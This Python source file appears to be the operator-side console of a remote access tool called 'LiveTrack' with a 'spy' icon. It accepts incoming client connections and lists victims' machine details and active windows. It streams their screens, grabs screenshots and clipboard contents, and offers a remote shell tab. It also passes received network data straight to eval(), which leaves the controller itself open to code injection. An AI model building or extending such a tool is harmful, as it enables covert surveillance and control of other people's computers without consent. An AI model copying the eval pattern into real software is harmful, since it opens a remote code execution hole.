from twisted.internet.endpoints import TCP4ServerEndpoint
from twisted.internet import task
from twisted.internet.protocol import Factory, Protocol, ServerFactory
from twisted.protocols.basic import NetstringReceiver
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from PyQt5 import QtGui, QtCore
from PyQt5.QtCore import Qt
from commands import command
from tabs.basicommands import BasicCommands
from tabs.shell import Shell
from tabs.general import General
from core import *
from remoteDisplay import remoteDisplay, remoteDisplayWindow
import sys
import time
import random
import qt5reactor

app = QApplication(sys.argv)

qt5reactor.install()

from twisted.internet import reactor


class MainWindow(QMainWindow, Protocol):

    def __init__(self, externalSelfObject):
        super().__init__()
        self.externalSelfObject = externalSelfObject
        self.InitializeVars()
        self.WindowProperties()
        self.setupWindowComponents()
    
    def setupWindowComponents(self):
        self.Actions()
        self.MainMenu()
        self.mainlayout = QSplitter(Qt.Horizontal)
        self.setCentralWidget(self.mainlayout)
        self.setupRemoteDisplayWindow()
        self.LeftPane()
        self.RightPane()
    
    def setupRemoteDisplayWindow(self):
        self.remotedisplay = remoteDisplay(self)
        self.remotedisplaywindow = remoteDisplayWindow(self)
        self.remotedisplaywindow.setCentralWidget(self.remotedisplay)
        self.remotedisplaywindow.setWindowTitle("Remote Machine")
        
    def connectionMade(self):
        item = QListWidgetItem()
        item.setText("Unknown User")
        item.setData(Qt.UserRole, self.transport)
        item.setIcon(QIcon("img/desktop.png"))
        self.connectedUsers[self.transport] = {'username' : 'No Username', 'item' : item}
        self.externalSelfObject.connectedUserList.insertItem(0, item)
        self.externalSelfObject.executeCommands(command.GENERAL, None)
        # self.transport.writeSequence((pack(command.GENERAL, None), b'\r\n'))

    def connectionLost(self, reason):
        item = self.connectedUsers[self.transport]['item']
        del self.connectedUsers[self.transport]
        index = self.externalSelfObject.connectedUserList.row(item)
        self.externalSelfObject.connectedUserList.takeItem(index)

    def dataReceived(self, data):
    # if linebreak in packet
        if b'\r\n' in data:
            # split packet
            tempbuf = data.split(b'\r\n')
            for i in tempbuf:
                if i == b'':
                    continue
                if tempbuf[-1] == b'':
                    if self.packet != b'':
                        self.packet += i
                        self.packet = self.packet.decode("utf-8")
                        cmd = eval(self.packet)
                        for key in cmd.keys():
                            args = cmd[key]
                        self.handler(key, args)
                        self.packet = b''
                    elif self.packet == b'':
                        self.packet = i
                        self.packet = self.packet.decode("utf-8")
                        cmd = eval(self.packet)
                        for key in cmd.keys():
                            args = cmd[key]
                        self.handler(key, args)
                        self.packet = b''
                else:
                    if tempbuf.index(i) == len(tempbuf)-1:
                        self.packet += i
                    elif self.packet != b'':
                        self.packet += i
                        self.packet = self.packet.decode("utf-8")
                        cmd = eval(self.packet)
                        for key in cmd.keys():
                            args = cmd[key]
                        self.handler(key, args)
                        self.packet = b''
                    elif self.packet == b'':
                        self.packet = i
                        self.packet = self.packet.decode("utf-8")
                        cmd = eval(self.packet)
                        for key in cmd.keys():
                            args = cmd[key]
                        self.handler(key, args)
                        self.packet = b''
        else:
            # start of frame sent i.e 655536 bytes
            self.packet += data


    def handler(self, key, args):
        if key == command.USERNAME:
            item = self.connectedUsers[self.transport]['item']
            item.setText(args)
        elif key == command.FRAME_UPDATE:
            self.updateframe(args)
        elif key == command.GENERAL:
            self.setGeneralInfo(args, None)
        elif key == command.GENERAL_UPDATE:
            self.setGeneralInfo(args, 1)
        
    
    def setGeneralInfo(self, info, flag):
        if flag == None:
            machinename = info['machinename']
            operatingsystem = info['os']
            activeuser = info['username']
            localip = info['localip']
            self.externalSelfObject.general.machinevalue.setText(machinename)
            self.externalSelfObject.general.osvalue.setText(operatingsystem)
            self.externalSelfObject.general.activeuservalue.setText(activeuser)
            self.externalSelfObject.general.localipvalue.setText(str(localip))
        uptime = info['uptime']
        cpu = str(info['cpu'])
        if cpu != '0.0':
            self.externalSelfObject.general.cpuvalue.setText(str(cpu))
        memory = info['memory']
        activewindow = info['currentapp']
        qp = QPixmap()
        qp.loadFromData(info['pixdata'])
        self.externalSelfObject.general.labelThumbnail.setPixmap(qp)
        self.externalSelfObject.general.uptimevalue.setText(str(secondsToDays(int(uptime))))
        self.externalSelfObject.general.memoryvalue.setText(memory+"%")
        self.externalSelfObject.general.activewindowvalue.setText(activewindow)
        if self.remoteWindowclosed == True:
            d = task.deferLater(reactor, 0.02, lambda:self.externalSelfObject.executeCommands(command.GENERAL_UPDATE, None))

    def updateframe(self, pixdata):
        qp = QPixmap()
        qp.loadFromData(pixdata)
        # qp = qp.scaled(1366, 768, Qt.KeepAspectRatio, transformMode = Qt.SmoothTransformation)
        self.externalSelfObject.remotedisplay.updatetheframe(qp)
        self.externalSelfObject.executeCommands(command.FRAME_UPDATE, None)
        # self.externalSelfObject.selectedUser.writeSequence((pack(command.FRAME_UPDATE, None), b'\r\n'))

    def LeftPane(self):
        widget = QWidget()
        widget.setMinimumWidth(200)
        widget.setMaximumWidth(350)
        vbox = QVBoxLayout()
        widget.setLayout(vbox)

        activeLabel = QLabel("<b>Active Connections</b>")
        self.connectedUserList = QListWidget()
        self.connectedUserList.currentItemChanged.connect(self.setSelectedItem)

        vbox.addWidget(activeLabel)
        vbox.addWidget(self.connectedUserList)
        self.mainlayout.addWidget(widget)

    def RightPane(self):
        
        self.basiccommands = BasicCommands(self)
        self.shell = Shell(self)
        self.general = General(self)
        tabWidget = QTabWidget()
        tabWidget.addTab(self.general, "General")
        tabWidget.addTab(self.basiccommands, "Basic Commands")
        tabWidget.addTab(self.shell, "Shell")

        self.mainlayout.addWidget(tabWidget)

    def Actions(self):
        self.exitaction = QAction(QIcon("img/exit.png"), 'Exit', self)
        self.exitaction.triggered.connect(self.exitapp)
        self.exitaction.setShortcut("Alt+F4")
        
        self.screenshotaction = QAction(QIcon("img/screenshot.png"), "Take Screenshot", self)
        self.screenshotaction.triggered.connect(lambda: self.executeCommands(command.SCREENSHOT, None))
        self.screenshotaction.setShortcut("Ctrl+H")

        self.clipboardaction = QAction(QIcon("img/clipboard.png"), "Clipboard contents", self)
        self.clipboardaction.triggered.connect(lambda: self.executeCommands(command.CLIPBOARD, None))

        self.helpaction = QAction(QIcon("img/help.png"), "Help", self)

    def MainMenu(self):
        mainmenu = self.menuBar()
        filemenu = mainmenu.addMenu("File")
        actionmenu = mainmenu.addMenu("Action")
        helpmenu = mainmenu.addMenu("Help")

        filemenu.addAction(self.exitaction)
        actionmenu.addAction(self.screenshotaction)
        actionmenu.addAction(self.clipboardaction)
        helpmenu.addAction(self.helpaction)

    def WindowProperties(self):
        self.title = "LiveTrack"
        self.top = 100
        self.left = 100
        self.width = 800
        self.height = 600
        self.setWindowIcon(QtGui.QIcon("spy.png"))
        self.setWindowTitle(self.title)
        self.setGeometry(self.left, self.top, self.width, self.height)

    def InitializeVars(self):
        self.selectedUser = None
        self.connectedUsers = {}
        self.packet = b''
        self.framebuffer = b''
        self.remoteWindowclosed = True
        self.expected_len = 0
    
    def exitapp(self):
        self.close()
    
    def executeCommands(self, key, args):
        if self.selectedUser == None:
            pass
        else:
            self.selectedUser.writeSequence((pack(key, args), b'\r\n'))
            

    def setSelectedItem(self, args=None):
        if args == None:
            self.selectedUser = None
        else:
            self.selectedUser = args.data(Qt.UserRole)
            self.executeCommands(command.GENERAL, None)

class QFactory(Factory):
    def __init__(self, window):
        self.window = window

    def buildProtocol(self, addr):
        return MainWindow(self.window)

if __name__ == '__main__':
    
    window = MainWindow(None)
    window.show()

    endpoint = TCP4ServerEndpoint(reactor, 8000)
    endpoint.listen(QFactory(window))


    app.setStyle('Fusion')
    palette = QtGui.QPalette()
    palette.setColor(QtGui.QPalette.Window, QtGui.QColor(53,53,53))
    palette.setColor(QtGui.QPalette.WindowText, QtCore.Qt.white)
    palette.setColor(QtGui.QPalette.Base, QtGui.QColor(15,15,15))
    palette.setColor(QtGui.QPalette.AlternateBase, QtGui.QColor(53,53,53))
    palette.setColor(QtGui.QPalette.ToolTipBase, QtCore.Qt.white)
    palette.setColor(QtGui.QPalette.ToolTipText, QtCore.Qt.white)
    palette.setColor(QtGui.QPalette.Text, QtCore.Qt.white)
    palette.setColor(QtGui.QPalette.Button, QtGui.QColor(53,53,53))
    palette.setColor(QtGui.QPalette.ButtonText, QtCore.Qt.white)
    palette.setColor(QtGui.QPalette.BrightText, QtCore.Qt.red)
            
    palette.setColor(QtGui.QPalette.Highlight, QtGui.QColor(142,45,197).lighter())
    palette.setColor(QtGui.QPalette.HighlightedText, QtCore.Qt.black)
    app.setPalette(palette)

    reactor.run()